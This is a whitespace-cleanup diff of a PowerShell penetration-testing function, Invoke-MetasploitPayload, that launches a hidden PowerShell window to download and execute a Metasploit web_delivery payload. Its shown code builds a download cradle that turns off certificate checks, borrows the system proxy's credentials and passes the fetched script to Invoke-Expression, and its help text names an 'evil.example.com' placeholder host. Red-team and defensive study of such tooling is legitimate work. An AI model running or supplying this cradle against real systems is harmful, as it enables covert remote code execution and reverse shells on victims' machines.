@@ -1,4 +1,4 @@
-function Invoke-MetasploitPayload 
+function Invoke-MetasploitPayload
 {
 <#
 .SYNOPSIS
@@ -7,13 +7,13 @@ Author: Jared Haight (@jaredhaight)
 License: MIT
 Required Dependencies: None
 Optional Dependencies: None
- 
+
 .DESCRIPTION
 Spawns a new, hidden PowerShell window that downloads and executes a Metasploit payload from a specified URL.
 
 This relies on the exploit/multi/scripts/web_delivery metasploit module. The web_delivery module generates a script for
 a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle
-starting up the listener for that payload. 
+starting up the listener for that payload.
 
 An example rc file is below (or you can just type the commands manually). It does the following:
 
@@ -35,7 +35,7 @@ run -j
 ==== end Invoke-MetasploitPayload rc file ====
 
 .PARAMETER url
-This is the URL for the download cradle, by default it will be something 
+This is the URL for the download cradle, by default it will be something
 like "https://evil.example.com/[Random Chars]"
 
 .EXAMPLE
@@ -61,7 +61,7 @@ Param
 
     Write-Verbose "[*] Creating Download Cradle script using $url"
     $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
-    
+
     Write-Verbose "[*] Figuring out if we're starting from a 32bit or 64bit process.."
     if([IntPtr]::Size -eq 4)
     {
@@ -73,7 +73,7 @@ Param
         Write-Verbose "[*] Looks like we're 32bit, using syswow64 powershell.exe"
         $PowershellExe=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
     };
-    
+
     Write-Verbose "[*] Creating Process Object.."
     $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
     $ProcessInfo.FileName=$PowershellExe
